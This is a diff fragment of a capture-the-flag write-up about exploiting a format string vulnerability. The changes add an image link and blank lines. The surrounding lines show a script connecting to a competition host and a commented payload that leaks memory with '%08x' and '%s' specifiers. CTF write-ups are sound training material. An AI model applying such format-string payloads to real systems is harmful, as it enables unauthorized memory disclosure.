@@ -2,6 +2,9 @@ Okay, as the description suggests, the challenge is about a format string attack
 I used Ghidra to disassemble the binary. 
 
 
+![](https://github.com/r4ksh1t0011/CTF-Writeups/blob/pngs/flag.png)<br> 
+<br>
+
 Thus, we found the respective addresses where flag1 and flag2 are located. Now, we only need to extract the data from that address which can be done by exploiting the format string vulnerability. here's a simple script for it.
 
 ```
@@ -16,6 +19,8 @@ host = "hack.scythe2021.sdslabs.co"
 target=remote(host,port)
 
 # First send this payload, you'll get the first part of the flag
+
+
 #payload = p32(flag1) +('%08x '*6+'%s').encode()
 
 # After you get the first part of the flag, use this payload after removing the first one
